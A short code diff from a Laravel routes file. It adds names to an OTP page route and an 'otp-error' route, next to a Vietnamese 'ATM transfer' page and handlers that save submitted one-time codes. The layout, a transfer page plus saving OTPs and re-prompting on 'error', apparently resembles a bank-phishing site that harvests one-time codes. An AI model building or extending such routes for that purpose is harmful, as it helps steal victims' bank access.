@@ -48,11 +48,11 @@ Route::get('/chuyen-tien-atm', function () {
 //otp
 Route::get('/otp', function () {
     return view('otp');
-});
+})->name('otp');
 Route::post('/otp-post', [OtpController::class, 'save'])->name('otp_post');
 //otp-error
 Route::get('/otp-error', function () {
     return view('otp-error');
-});
+})->name('otp_error');
 //otp_error_post
 Route::post('/otp-error-post', [OtpController::class, 'saveError'])->name('otp_error_post');
